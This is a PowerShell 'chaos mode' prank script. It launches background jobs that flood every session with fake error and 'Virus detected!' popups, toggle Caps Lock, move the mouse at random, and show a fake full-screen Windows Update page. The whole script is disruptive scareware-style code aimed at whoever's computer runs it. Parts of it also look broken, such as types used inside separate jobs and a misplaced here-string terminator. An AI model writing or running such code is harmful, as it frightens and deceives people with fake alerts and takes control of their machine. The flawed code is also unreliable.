Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int x, int y);
}
"@ -Language CSharp

# Infinite Popups
Start-Job -ScriptBlock {
    while ($true) {
        $messages = @("System Error!", "Warning: Critical Failure", "Your system is overheating!", "Virus detected!", "Windows will shut down soon...")
        $msg = $messages | Get-Random
        msg * $msg
        Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
    }
}

# Random Caps Lock Toggler
Start-Job -ScriptBlock {
    while ($true) {
        [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
    }
}

# Mouse Drifting
Start-Job -ScriptBlock {
    while ($true) {
        [Mouse]::SetCursorPos((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
        Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
    }
}

# Fake Windows Update Screen
Start-Job -ScriptBlock {
    $htm = @"
    <html><head><style>body{background:#002147;color:white;text-align:center;font-size:50px;padding-top:20%}</style></head>
    <body>Working on updates...<br>0% Complete</body></html>
    "@
    $path = "$env:TEMP\update.html"
    $htm | Set-Content -Path $path
    Start-Process "chrome.exe" -ArgumentList "$path --start-fullscreen"
}

# Fake Windows Error Messages
Start-Job -ScriptBlock {
    while ($true) {
        msg * "Error: Windows has encountered a critical failure."
        Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 40)
    }
}

Write-Host "Chaos Mode Activated! Press CTRL+C to exit." -ForegroundColor Red
